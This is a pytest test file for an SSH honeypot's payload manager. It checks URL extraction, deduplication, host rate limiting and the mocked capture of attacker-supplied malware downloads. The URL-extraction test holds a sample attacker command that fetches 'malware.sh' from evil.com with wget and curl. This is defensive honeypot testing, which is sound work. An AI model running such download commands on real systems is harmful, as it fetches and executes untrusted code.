import pytest
import os
import shutil
import tempfile
import sqlite3
import hashlib
from unittest.mock import MagicMock, patch

from ssh_honeypot.core.database import HoneyDB
from ssh_honeypot.core.payload_manager import PayloadManager


# --- Fixtures ---
@pytest.fixture
def mock_db():
    # Use in-memory DB for speed and isolation
    # But HoneyDB expects a path. We can give it a temp path.
    temp_dir = tempfile.mkdtemp()
    db_path = os.path.join(temp_dir, "test_honeypot.sqlite")

    # We strip the path from the class or instance?
    # HoneyDB.__init__ takes db_path.
    db = HoneyDB(db_path)
    yield db

    # Cleanup
    shutil.rmtree(temp_dir)


@pytest.fixture
def payload_manager(mock_db):
    pm = PayloadManager(mock_db)
    # Redirect PAYLOAD_DIR to a temp dir so we don't mess with real data
    temp_payload_dir = tempfile.mkdtemp()
    with patch("ssh_honeypot.core.payload_manager.PAYLOAD_DIR", temp_payload_dir):
        # We need to re-ensure dir potentially if checking existance
        if not os.path.exists(temp_payload_dir):
            os.makedirs(temp_payload_dir)
        yield pm
    shutil.rmtree(temp_payload_dir)


# --- Tests ---


def test_extract_urls(payload_manager):
    text = "Run wget http://evil.com/malware.sh and curl https://site.org/loader"
    urls = payload_manager.extract_urls(text)
    assert len(urls) == 2
    assert "http://evil.com/malware.sh" in urls
    assert "https://site.org/loader" in urls

    # Test no URLs
    assert payload_manager.extract_urls("ls -la /root") == []


def test_queue_payload_deduplication(payload_manager, mock_db):
    url = "http://bad.com/virus.exe"
    sid = "sess1"
    ip = "1.2.3.4"

    # First Add
    payload_manager.queue_payload(url, sid, ip)

    pending = mock_db.get_pending_payloads()
    assert len(pending) == 1
    assert pending[0]["url"] == url

    # Second Add (Duplicate) - Should return early
    payload_manager.queue_payload(url, sid, ip)

    pending = mock_db.get_pending_payloads()
    assert len(pending) == 1  # Still 1


def test_host_rate_limiting(payload_manager, mock_db):
    # Host A
    url1 = "http://host-a.com/file1"
    url2 = "http://host-a.com/file2"

    # Add first
    payload_manager.queue_payload(url1, "s1", "1.1.1.1")
    assert len(mock_db.get_pending_payloads()) == 1

    # Add second from SAME HOST - should be blocked
    # Note: Logic relies on finding entry in DB. Since we queued it (pending), it is in local DB.
    # is_payload_host_rate_limited checks timestamp > 24h ago.
    payload_manager.queue_payload(url2, "s1", "1.1.1.1")

    # Should still be 1 (second was skipped)
    assert len(mock_db.get_pending_payloads()) == 1


def test_process_queue_success(payload_manager, mock_db):
    url = "http://example.com/payload"
    mock_content = b"malicious_content_123"
    expected_md5 = hashlib.md5(mock_content).hexdigest()

    # Queue
    payload_manager.queue_payload(url, "s1", "1.1.1.1")

    # Mock requests.get
    with patch("requests.get") as mock_get:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.iter_content.return_value = [mock_content]
        mock_get.return_value.__enter__.return_value = mock_resp

        payload_manager.process_queue()

    # Check DB Status
    conn = mock_db._get_conn()
    c = conn.cursor()
    c.execute("SELECT * FROM malicious_payloads WHERE url = ?", (url,))
    row = c.fetchone()
    conn.close()

    assert row is not None
    assert row[6] == "completed"  # Status
    assert row[7] == expected_md5  # MD5
    assert row[8] == len(mock_content)  # Size
    assert f"dangerous_{expected_md5}.txt" in row[9]  # File path


def test_process_queue_failure_404(payload_manager, mock_db):
    url = "http://fail.com/404"
    payload_manager.queue_payload(url, "s1", "1.1.1.1")

    with patch("requests.get") as mock_get:
        # Mock raising HTTPError
        from requests.exceptions import HTTPError

        mock_resp = MagicMock()
        mock_resp.raise_for_status.side_effect = HTTPError("404 Not Found")
        mock_get.return_value.__enter__.return_value = mock_resp

        payload_manager.process_queue()

    conn = mock_db._get_conn()
    row = conn.execute(
        "SELECT * FROM malicious_payloads WHERE url = ?", (url,)
    ).fetchone()
    conn.close()

    assert row[6] == "failed"
    assert "404" in row[11]  # Error message


def test_duplicate_file_content_handling(payload_manager, mock_db):
    # Two different URLs pointing to content with SAME MD5
    url1 = "http://site1.com/malware"
    url2 = "http://site2.com/malware_copy"  # Different host, allowed

    content = b"same_content"

    # Queue both
    payload_manager.queue_payload(url1, "s1", "1.1.1.1")
    payload_manager.queue_payload(url2, "s1", "1.1.1.1")

    with patch("requests.get") as mock_get:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.iter_content.return_value = [content]
        mock_get.return_value.__enter__.return_value = mock_resp

        # Process first
        payload_manager.process_queue()

        # Process second
        payload_manager.process_queue()

    # Check DB
    conn = mock_db._get_conn()
    rows = conn.execute("SELECT * FROM malicious_payloads").fetchall()
    conn.close()

    assert len(rows) == 2
    r1 = rows[0]
    r2 = rows[1]

    assert r1[6] == "completed"
    assert r2[6] == "completed"

    # Should point to SAME file path? Or just verify file exists?
    # Implementation: checks if os.path.exists(file_path). If yes, logs duplicate and uses it.
    # So both should have same file_path
    assert r1[9] == r2[9]
